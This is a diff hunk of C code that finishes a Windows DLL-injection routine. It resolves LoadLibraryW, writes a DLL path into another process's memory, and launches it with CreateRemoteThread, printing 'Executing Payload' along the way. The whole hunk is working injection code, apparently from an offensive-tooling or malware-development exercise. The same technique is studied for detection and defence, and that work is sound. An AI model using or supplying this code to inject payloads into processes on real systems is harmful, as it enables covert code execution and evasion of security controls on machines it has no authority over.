@@ -61,4 +61,48 @@ BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
 	// FETCHING THE SIZE OF DLLNAME IN BYTES
 	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
 
+	SIZE_T lpNumberOfBytesWritten = NULL;
+	HANDLE hThread = NULL;
+
+	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+	if (pLoadLibraryW == NULL) {
+		printf("[!] GetProcAddress Failed with error : %d \n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+
+	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf("[!] VirtualAllocEx Failed with error : %d \n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+	printf("[i] pAddress Allocated at : 0x%p Of Size : %d \n", pAddress, dwSizeToWrite);
+	printf("[#] Press <enter> To Run ...");
+	getchar();
+
+	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
+		printf("[!] WriteProcessMemory Failed with error : %d \n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+
+
+	printf("[i] Successfully Written %d Bytes \n", lpNumberOfBytesWritten);
+	printf("[#] Press <enter> To Run ...");
+	getchar();
+
+	printf("[i] Executing Payload...");
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+	if (hThread == NULL) {
+		printf("[!] CreateRemoteThread Failed with error : %d \n", GetLastError());
+		bSTATE = FALSE;
+		goto _EndOfFunction;
+	}
+	printf("[+] DONE \n");
+
+_EndOfFunction:
+	if (hThread != NULL)
+		CloseHandle(hThread);
+	return bSTATE;
 }
